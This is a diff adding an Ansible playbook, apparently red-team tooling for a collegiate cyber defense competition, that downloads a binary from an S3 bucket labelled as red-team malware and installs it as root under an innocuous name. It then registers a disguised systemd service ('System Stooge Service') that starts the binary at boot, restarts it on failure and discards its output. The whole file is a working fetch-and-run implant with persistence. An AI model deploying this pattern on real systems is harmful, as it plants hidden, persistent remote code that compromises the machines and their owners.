@@ -1,0 +1,52 @@
+---
+- name: Download binary
+  ansible.builtin.get_url:
+    url: "https://neccdc-2026-red-team-malware-argnaorbgaoierbhaoerinb.s3.us-east-2.amazonaws.com/larry/x86_64"
+    dest: "/usr/local/bin/stooge1"
+    mode: "0755"
+    owner: root
+    group: root
+  tags:
+    - larry
+    - red-team
+
+- name: Create systemd unit
+  ansible.builtin.copy:
+    dest: "/etc/systemd/system/stooge1.service"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Stooge Service
+      After=network.target sshd.service
+
+      [Service]
+      Type=simple
+      ExecStart=/usr/local/bin/stooge1
+      Restart=on-failure
+      RestartSec=5
+      StandardOutput=null
+      StandardError=journal
+
+      [Install]
+      WantedBy=multi-user.target
+  tags:
+    - larry
+    - red-team
+
+- name: Reload systemd
+  ansible.builtin.systemd:
+    daemon_reload: true
+  tags:
+    - larry
+    - red-team
+
+- name: Enable and start service
+  ansible.builtin.systemd:
+    name: stooge1
+    enabled: true
+    state: started
+  tags:
+    - larry
+    - red-team
